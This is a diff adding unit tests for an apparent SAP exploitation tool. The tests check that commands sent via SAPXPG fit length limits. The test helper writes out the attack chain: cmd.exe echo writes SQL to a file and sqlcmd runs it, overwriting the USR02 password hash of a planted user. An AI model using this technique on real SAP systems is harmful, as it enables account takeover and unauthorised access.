@@ -16,7 +16,7 @@ from sapmap_config import (
     sql_oracle,
     sql_db2,
 )
-from sapmap_exploit import _cmd_caret_escape
+from sapmap_exploit import _cmd_caret_escape, _mssql_write_and_exec_win
 
 
 # ---------------------------------------------------------------------------
@@ -234,3 +234,82 @@ def test_caret_escape_sql_with_parens():
     assert "^)" in escaped
     # Apostrophes and commas must not be touched
     assert "'000'" in escaped
+
+
+# ---------------------------------------------------------------------------
+# _mssql_write_and_exec_win — PARAMS length guard
+#
+# The key regression: the PASSCODE UPDATE is ~134 bytes as a command line,
+# which exceeds the 128-byte EXTPROG limit of the old per-statement approach.
+# The file-based function must keep each echo PARAMS under 255 bytes.
+# ---------------------------------------------------------------------------
+
+def _get_mssql_echo_params(sid, inst, sql_stmts):
+    """Collect the (ext_cmd, ext_params) pairs that _mssql_write_and_exec_win
+    would send, without actually opening a socket."""
+    from sapmap_exploit import _cmd_caret_escape
+    workdir  = f"C:\\usr\\sap\\{sid}\\DVEBMGS{inst}\\work"
+    sql_file = f"{workdir}\\sapmap_mss.sql"
+    cmds = []
+    first = True
+    for sql in sql_stmts:
+        stripped = sql.strip()
+        if not stripped:
+            continue
+        esc = _cmd_caret_escape(stripped)
+        redirect = f"> {sql_file}" if first else f">> {sql_file}"
+        params = f"/C echo {esc} {redirect}"
+        first = False
+        cmds.append(("cmd.exe", params))
+    cmds.append(("sqlcmd", f"-S localhost -d {sid} -i \"{sql_file}\""))
+    return cmds
+
+
+def test_mssql_passcode_update_fits_in_params():
+    """PASSCODE UPDATE must fit in PARAMS (≤255 bytes).
+
+    Root cause of the TWT failure: the old approach put
+        sqlcmd -S localhost -Q "UPDATE TWT.USR02 SET PASSCODE=0x<40hex>..."
+    into EXTPROG (128 B max).  That statement is ~134 bytes → SAPXPG truncates
+    it → sqlcmd gets malformed SQL → 'SAPXPG command failed'.
+
+    The file-based approach puts only "cmd.exe" in EXTPROG (7 bytes) and the
+    echo command in PARAMS (255 bytes max).  Verify it fits.
+    """
+    from sapmap_config import sql_mssql_abap, BCODE_HEX, PASSCODE_HEX
+    sid, client, username = "TWT", "000", "SAPMAP00"
+    stmts = [s for s in sql_mssql_abap(sid, client, username)
+             if not s.strip().upper().startswith("DELETE")]
+    cmds = _get_mssql_echo_params(sid, "01", stmts)
+    for ext_cmd, ext_params in cmds:
+        assert len(ext_cmd)    <= 128, f"EXTPROG too long: {ext_cmd!r}"
+        assert len(ext_params) <= 255, (
+            f"PARAMS too long ({len(ext_params)} bytes): {ext_params[:80]!r}")
+
+
+def test_mssql_passcode_old_approach_would_overflow():
+    """Confirm that the OLD per-statement approach DID overflow EXTPROG.
+
+    This is a regression test — it documents the original bug: building
+    'sqlcmd -S localhost -Q "<sql>"' as the EXTPROG string for the PASSCODE
+    UPDATE produces a string > 128 bytes.
+    """
+    from sapmap_config import PASSCODE_HEX
+    sid, client, username = "TWT", "000", "SAPMAP00"
+    passcode_sql = (f"UPDATE {sid}.USR02 SET PASSCODE=0x{PASSCODE_HEX} "
+                    f"WHERE MANDT='{client}' AND BNAME='{username}'")
+    old_extprog = f"sqlcmd -S localhost -Q \"{passcode_sql}\""
+    assert len(old_extprog) > 128, (
+        f"Expected old approach to overflow 128 bytes, got {len(old_extprog)}")
+
+
+def test_mssql_file_includes_go_separators():
+    """GO batch separators from sql_mssql_abap must survive into the echo commands."""
+    from sapmap_config import sql_mssql_abap
+    sid, client, username = "TWT", "000", "SAPMAP00"
+    stmts = [s for s in sql_mssql_abap(sid, client, username)
+             if not s.strip().upper().startswith("DELETE")]
+    cmds = _get_mssql_echo_params(sid, "01", stmts)
+    # At least one echo command should write "GO" to the file
+    go_echoes = [p for _, p in cmds if "echo GO" in p]
+    assert go_echoes, "GO batch separators must be written to the SQL file"
